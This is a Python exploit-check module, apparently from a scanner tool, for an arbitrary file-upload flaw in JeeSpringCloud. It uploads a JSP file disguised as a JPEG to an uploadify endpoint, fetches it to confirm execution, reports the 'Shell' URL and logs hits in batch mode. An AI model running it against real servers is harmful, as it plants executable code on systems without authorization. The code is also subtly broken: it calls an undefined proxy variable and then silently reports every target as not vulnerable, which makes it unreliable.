import requests
import urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
urllib3.disable_warnings()

class JeeSpringCloudUploadFileScan:
    def main(self,target):
        self.batch = target["batch_work"]
        urls = target['url'].strip("/ ")
        header = target["header"]
        proxy = target["proxy"]
        ssl = target["ssl"]
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("JeeSpringCloud", "开始检测漏洞...")
        headers = {
            "Host": urls.split("://")[-1],
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": header,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Cookie": "com.jeespring.session.id=eadfcf72ad854e1cbe65dd3513d5baba",
            "Connection": "close",
        }
        files = {
            "fileshare": ("923.jsp", "<% out.println(\"hello jeespringcloud888\"); %>", "image/jpeg"),
        }

        url = f"{urls}/static/uploadify/uploadFile.jsp?uploadPath=/static/uploadify/"
        try:
            response = requests.post(url,verify=ssl,files=files,headers=headers,proxies=proxys)
            url2 = f"{urls}/static/uploadify/923.jsp"
            response2 = requests.get(url2,verify=ssl,headers={"User-Agent": header},proxies=proxys)
            if response2.url == url2 and "jeespringcloud888" in response2.text:
                if not self.batch:
                    OutPrintInfoSuc("JeeSpringCloud", f"存在漏洞 {url}")
                    OutPrintInfo("JeeSpringCloud", f"[b bright_red]Shell {url2}")
                else:
                    OutPrintInfoSuc("JeeSpringCloud", f"存在漏洞 {url}")
                    with open("./result/spring_jeespringcloud_file_upload.txt","a") as w:
                        w.write(f"{url2}")
            else:
                if not self.batch:
                    OutPrintInfo("JeeSpringCloud", "不存在漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("JeeSpringCloud", "不存在漏洞")
        if not self.batch:
            OutPrintInfo("JeeSpringCloud", "漏洞检测结束")



